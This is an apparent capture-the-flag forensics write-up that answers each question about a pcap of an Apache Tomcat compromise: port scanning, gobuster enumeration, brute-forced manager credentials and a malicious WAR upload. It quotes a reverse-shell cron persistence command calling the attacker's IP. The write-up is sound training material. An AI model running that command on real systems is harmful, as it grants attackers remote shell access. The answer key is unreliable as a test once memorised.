# Tomcat Takeover

## Info

- Category : Network Forensics
- SHA1SUM : 56cc3f2aed9beb326eec027ae5dc9971a37da57d
- Published : Sept. 15, 2023, 4 p.m.
- Author : Chadou
- Size : 459 KB
- Tags : Wireshark PCAP Tomcat Network NetworkMiner
- Password : cyberdefenders.org

### Scenario

Our SOC team has detected suspicious activity on one of the web servers within the company's intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.

### Helpful Tools

- Wireshark
- NetworkMiner

---

## Questions

### Q1 - Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

`Statistics > IPv4 statistics > Destination and Ports`

We see 2 IP with lot of connection to many ports. Second clue, we also see many SYN and RST requests which is suspicious.

**Answer : 14.0.0.120**

### Q2 - Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?

https://www.whois.com/whois/14.0.0.120

**Answer : Guangzhou**

### Q3 - From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel?

Do a filter `ip.addr == 14.0.0.120` and search on wireshark for a request made on an endpoint which contain `admin`. You will find `admin` & `admin-console` endpoints. Get the port of those requests.

**Answer : 8080**

### Q4 - Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

`User-Agent: gobuster/3.6`

**Answer : gobuster**

### Q5 - Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?

Look for a request made on `/admin` (stream 9449), `follow the HTTP stream `and you will get multiple request on a folder.

**Answer : /manager**

### Q6 - Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?

Filter : `ip.addr == 14.0.0.120 and http.request.method == "POST"`. In the `Authorization` section : `Authorization: Basic YWRtaW46dG9tY2F0`

```shell
echo 'YWRtaW46dG9tY2F0' | base64 -d
admin:tomcat
```

Or it's just print in wireshark.

**Answer : admin:tomcat**

### Q7 - Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

In the same packet, the endpoint is `/manager/html/upload`. Look into `the MIME section`.

`Content-Disposition: form-data; name="deployWar"; filename="JXQOZY.war"`

**Answer : JXQOZY.war**

### Q8 - Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

We notice a request on `/JXQOZY`. The following stream contains commands and the command used to establish persistence.

```shell
whoami
root
cd /tmp
pwd
/tmp
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'" > cron
crontab -i cron

crontab -l
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

**Answer : /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'**